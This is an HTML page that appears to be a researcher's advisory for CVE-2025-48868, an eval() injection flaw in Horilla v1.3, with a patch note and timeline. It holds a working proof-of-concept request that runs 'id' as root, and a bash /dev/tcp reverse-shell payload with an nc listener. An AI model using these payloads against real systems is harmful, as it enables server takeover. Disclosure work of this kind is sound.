<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CVE-2025-48868 – Authenticated RCE via eval() in Horilla</title>
  <style>
    body {
      background-color: black;
      color: white;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0 20px;
    }

    header {
      text-align: center;
      padding: 2rem 0;
    }

    h1 {
      font-size: 2.5em;
      margin-bottom: 0.5rem;
    }

    .tag {
      display: inline-block;
      background-color: #6e5494;
      color: white;
      font-size: 0.8em;
      padding: 4px 8px;
      border-radius: 4px;
      margin-bottom: 1rem;
    }

    small {
      color: #aaa;
      font-family: monospace;
    }

    article {
      max-width: 800px;
      margin: auto;
      line-height: 1.6;
    }

    h2 {
      color: #6e5494;
      margin-top: 2rem;
    }

    a {
      color: #6e5494;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    pre {
      background-color: #1e1e1e;
      padding: 1rem;
      overflow-x: auto;
      border-radius: 6px;
      border: 1px solid #555;
    }

    code {
      font-family: monospace;
      color: #9cdcfe;
    }

    footer {
      text-align: center;
      margin-top: 3rem;
      font-size: 0.8em;
      color: white;
    }

    footer a {
      color: white;
    }

    footer a:hover {
      color: #6e5494;
    }
  </style>
</head>
<body>

<header>
  <h1>CVE-2025-48868</h1>
  <div class="tag">Authenticated Remote Code Execution</div>
  <p><em>Eval Injection in project_bulk_archive in Horilla v1.3</em></p>
</header>

<article>
  <h2>Overview</h2>
  <p>An authenticated Remote Code Execution (RCE) vulnerability exists in Horilla v1.3 due to the unsafe use of Python's <code>eval()</code> function on a user-controlled query parameter in the <code>project_bulk_archive</code> view. This allows privileged users (e.g., administrators) to execute arbitrary system commands on the server.</p>
  
  <p>While having Django's <code>DEBUG=True</code> makes exploitation visibly easier by returning command output in the HTTP response, this is not required. The vulnerability can still be exploited in <code>DEBUG=False</code> mode by using blind payloads such as a reverse shell, leading to full remote code execution.</p>

  <h2>Affected Versions</h2>
  <ul>
    <li>Horilla v1.3</li>
  </ul>

  <h2>Patched Versions</h2>
  <ul>
    <li>Horilla v1.3.1</li>
  </ul>

  <h2>Technical Details</h2>
  <p>In <code>projects/views.py</code>, the <code>project_bulk_archive</code> function performs bulk archiving of Project instances. The vulnerable code is:</p>
  
  <pre><code>is_active = eval(request.GET.get("is_active"))</code></pre>
  
  <p>This line evaluates the <code>is_active</code> parameter directly using <code>eval()</code> without any validation or sanitization, making it vulnerable to code injection. When <code>DEBUG=True</code>, Django returns detailed error messages, including the output of any expression evaluated by <code>eval()</code>.</p>

  <p>To successfully exploit this, the attacker must first create a project and then trigger the bulk archive operation with a malicious payload in the <code>is_active</code> parameter.</p>

  <p><strong>Required Conditions:</strong></p>
  <ul>
    <li>Authenticated user with project archiving privileges (e.g., admin)</li>
    <li>At least one project created before initiating the archive</li>
    <li>Arbitrary code injection via <code>is_active</code> query parameter</li>
    <li>For visible output: <code>DEBUG=True</code></li>
    <li>For silent RCE (e.g., reverse shell): <code>DEBUG=False</code> is still exploitable</li>
  </ul>

  <h2>PoC – Debug Mode ON</h2>
  <p>Steps to reproduce:</p>
  <pre><code>1. Create a project via the application's project creation interface.
2. Trigger the bulk archive operation using the following crafted HTTP request.</code></pre>

  <p><strong>Malicious Request:</strong></p>
  <pre><code>POST /project/project-bulk-archive?is_active=__import__('os').popen('id').read() HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8000/project/project-view/
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 70
Origin: http://localhost:8000
DNT: 1
Connection: keep-alive
Cookie: sessionid=n3hsxa0ot6pgmvjcmxxcfu4fmrwmd0uo; csrftoken=NMO61HgtbDLLylhvodv6fI1dSrAOj0r9
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

csrfmiddlewaretoken=NMO61HgtbDLLylhvodv6fI1dSrAOj0r9&ids=%5B%225%22%5D</code></pre>

  <p><strong>Response (if DEBUG=True):</strong></p>
  <pre><code>ValidationError at /project/project-bulk-archive
["uid=0(root) gid=0(root) groups=0(root)\n value must be either True or False."]</code></pre>

  <p>This error message confirms that the payload <code>__import__('os').popen('id').read()</code> was executed by <code>eval()</code>, and its result was returned in the error stack trace.</p>

  <p>Video PoC: <a href="https://drive.google.com/file/d/1XQAJilt77QxkjGEa94CsZRqZIZXa3ET9/view?usp=sharing" target="_blank">View PoC (Debug ON)</a><small> - https://drive.google.com/file/d/1XQAJilt77QxkjGEa94CsZRqZIZXa3ET9/view?usp=sharing</small></p>

  <h2>PoC – Debug Mode OFF</h2>
  <p>You lose visibility into return values or errors — so <code>popen('id').read()</code> doesn't help you anymore. However, if you use a "blind" payload (i.e., it performs an action instead of returning output), like a reverse shell, you still get full RCE.</p>

  <p>Steps to reproduce:</p>
  <pre><code>1. Create a project via the application's project creation interface.
2. Trigger the bulk archive operation with payload:
   __import__('os').system('bash+-c+"bash+-i+>%26+/dev/tcp/IP/PORT+0>%261"')
3. On attacker machine run: nc -lnvp PORT</code></pre>

  <p>Video PoC: <a href="https://drive.google.com/file/d/1hnI9AK3fnpVrTlTRF7aRJsKhZCDIm2Ve/view?usp=sharing" target="_blank">View PoC (Reverse Shell)</a><small> - https://drive.google.com/file/d/1hnI9AK3fnpVrTlTRF7aRJsKhZCDIm2Ve/view?usp=sharing</small></p>

  <h2>Impact</h2>
  <ul>
    <li><strong>Impact:</strong> Full command execution on the host system (server takeover)</li>
    <li><strong>Vulnerability Type:</strong> Authenticated Remote Code Execution (RCE)</li>
    <li><strong>CWE ID:</strong> CWE-95: Eval Injection</li>
    <li><strong>Severity:</strong> High</li>
    <li><strong>Exploitability:</strong> High (requires authenticated access)</li>
  </ul>

  <h2>Solution</h2>
  <ul>
    <li>Upgrade to <strong>Horilla v1.3.1</strong> or later.</li>
    <li>Never use <code>eval()</code> on user-controlled input.</li>
    <li>Implement proper input validation and use safe alternatives like <code>ast.literal_eval()</code> for evaluating trusted data.</li>
  </ul>

  <h2>Timeline</h2>
  <ul>
    <li>2025-05-18 – Vulnerability reported</li>
    <li>2025-05-20 – Patch released</li>
    <li>2025-05-28 – CVE assigned (CVE-2025-48868)</li>
    <li>2025-09-24 – Advisory published (GHSA-h6qj-pwmx-wjhw)</li>
  </ul>

  <h2>References</h2>
  <ul>
     <li><a href="https://github.com/NaklehZeidan21/NaklehZeidan21.github.io/blob/main/CVE/Exploits/CVE-2025-48868.py" target="_blank">CVE-2025-48868 Exploit</a> <small> - https://github.com/NaklehZeidan21/NaklehZeidan21.github.io/blob/main/CVE/Exploits/CVE-2025-48868.py</small></li>
    <li><a href="https://github.com/horilla-opensource/horilla/security/advisories/GHSA-h6qj-pwmx-wjhw" target="_blank">Horilla Security Advisory</a> <small> - https://github.com/horilla-opensource/horilla/security/advisories/GHSA-h6qj-pwmx-wjhw</small></li>
    <li><a href="https://drive.google.com/file/d/1XQAJilt77QxkjGEa94CsZRqZIZXa3ET9/view?usp=sharing" target="_blank">PoC Video (Debug ON)</a> <small> - https://drive.google.com/file/d/1XQAJilt77QxkjGEa94CsZRqZIZXa3ET9/view?usp=sharing</small></li>
    <li><a href="https://drive.google.com/file/d/1hnI9AK3fnpVrTlTRF7aRJsKhZCDIm2Ve/view?usp=sharing" target="_blank">PoC Video (Reverse Shell)</a> <small> - https://drive.google.com/file/d/1hnI9AK3fnpVrTlTRF7aRJsKhZCDIm2Ve/view?usp=sharing</small></li>
  </ul>
</article>

<footer>
  <p>
    &copy; 2025 <a href="https://github.com/NaklehZeidan21" target="_blank">Nakleh Zeidan</a>
  </p>
</footer>

</body>
</html>
